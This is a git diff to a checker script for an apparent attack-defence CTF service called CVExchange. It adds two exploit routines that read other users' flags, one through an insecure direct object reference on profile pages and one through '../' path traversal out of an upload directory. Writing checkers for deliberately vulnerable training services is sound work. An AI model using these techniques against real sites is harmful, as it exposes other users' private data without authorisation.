@@ -6,6 +6,8 @@ from enochecker3 import (
     GetflagCheckerTaskMessage,
     MumbleException,
     PutflagCheckerTaskMessage,
+    ExploitCheckerTaskMessage,
+    InternalErrorException
 )
 from enochecker3.utils import FlagSearcher, assert_equals, assert_in
 from bs4 import BeautifulSoup
@@ -18,7 +20,7 @@ checker = Enochecker("CVExchange", 1337)
 
 
 @checker.putflag(0)
-async def putflag_test(task: PutflagCheckerTaskMessage, client: AsyncClient, db: ChainDB) -> None:
+async def putflag_note(task: PutflagCheckerTaskMessage, client: AsyncClient, db: ChainDB) -> None:
 
     # register so client has a cookie 
     name, password = ''.join(random.choices(string.ascii_letters + string.digits, k=10)), ''.join(random.choices(string.ascii_letters + string.digits, k=10))
@@ -33,7 +35,7 @@ async def putflag_test(task: PutflagCheckerTaskMessage, client: AsyncClient, db:
 
 
 @checker.putflag(1)
-async def putflag_test(task: PutflagCheckerTaskMessage, client: AsyncClient, db: ChainDB) -> None:
+async def putflag_private(task: PutflagCheckerTaskMessage, client: AsyncClient, db: ChainDB) -> None:
    
     # register so client has a cookie 
     name, password = ''.join(random.choices(string.ascii_letters + string.digits, k=10)), ''.join(random.choices(string.ascii_letters + string.digits, k=10))
@@ -51,7 +53,7 @@ async def putflag_test(task: PutflagCheckerTaskMessage, client: AsyncClient, db:
 
 
 @checker.getflag(0)
-async def getflag_test(task: GetflagCheckerTaskMessage, client: AsyncClient, db: ChainDB) -> None:
+async def getflag_note(task: GetflagCheckerTaskMessage, client: AsyncClient, db: ChainDB) -> None:
 
     # retrieve login data from the DB
     try:
@@ -80,7 +82,7 @@ async def getflag_test(task: GetflagCheckerTaskMessage, client: AsyncClient, db:
 
 
 @checker.getflag(1)
-async def getflag_test(task: GetflagCheckerTaskMessage, client: AsyncClient, db: ChainDB) -> None:
+async def getflag_private(task: GetflagCheckerTaskMessage, client: AsyncClient, db: ChainDB) -> None:
     
     # retrieve login data from the DB
     try:
@@ -107,11 +109,49 @@ async def getflag_test(task: GetflagCheckerTaskMessage, client: AsyncClient, db:
     assert_equals(flagResp.status_code, 200, "couldn't retrieve the flag from private directory")
     assert_in(task.flag, flagResp.text, "flag not found in private directory")
 
-#TODO:
+
 @checker.exploit(0)
-async def exploit_test(searcher: FlagSearcher, client: AsyncClient) -> Optional[str]:
-    
-    response = await client.get("/note/*")
-    assert not response.is_error
-    if flag := searcher.search_flag(response.text):
+async def exploit_note(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, client: AsyncClient) -> Optional[str]:
+
+    # retrieve userId from attackinfo
+    if(task.attack_info == ""):
+        raise InternalErrorException("Attack info is empty")
+    userId = task.attack_info
+
+    # register so client has a cookie 
+    name, password = ''.join(random.choices(string.ascii_letters + string.digits, k=10)), ''.join(random.choices(string.ascii_letters + string.digits, k=10))
+    email = ''.join(random.choices(string.ascii_letters + string.digits, k=5)) + '@' + ''.join(random.choices(string.ascii_letters + string.digits, k=5))
+    registerResp = await client.post("/user/register", json={"name": name, "email": email, "password": password})
+    assert_equals(registerResp.status_code, 302, "couldn't register a new user under /user/register")
+
+    # exploit
+    flagResp = await client.get(f"/user/profile/{userId}?userId={userId}")
+    assert_equals(flagResp.status_code, 200, "couldn't load profile page with flag")
+
+    # retrieve and return the flag
+    if flag := searcher.search_flag(flagResp.text):
         return flag
+
+
+@checker.exploit(1)
+async def exploit_private(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, client: AsyncClient) -> Optional[str]:
+
+    # retrieve userId from attackinfo
+    if(task.attack_info == ""):
+        raise InternalErrorException("Attack info is empty")
+    userId = task.attack_info
+
+    # register so client has a cookie 
+    name, password = ''.join(random.choices(string.ascii_letters + string.digits, k=10)), ''.join(random.choices(string.ascii_letters + string.digits, k=10))
+    email = ''.join(random.choices(string.ascii_letters + string.digits, k=5)) + '@' + ''.join(random.choices(string.ascii_letters + string.digits, k=5))
+    registerResp = await client.post("/user/register", json={"name": name, "email": email, "password": password})
+    assert_equals(registerResp.status_code, 302, "couldn't register a new user under /user/register")
+
+    # exploit
+    flagResp = await client.get(f"/uploads/{base64.b64encode(userId.encode()).decode()}/public/../private/flag.txt")
+    assert_equals(flagResp.status_code, 200, "couldn't load flag from private directory")
+
+    # retrieve and return the flag
+    if flag := searcher.search_flag(flagResp.text):
+        return flag
+    
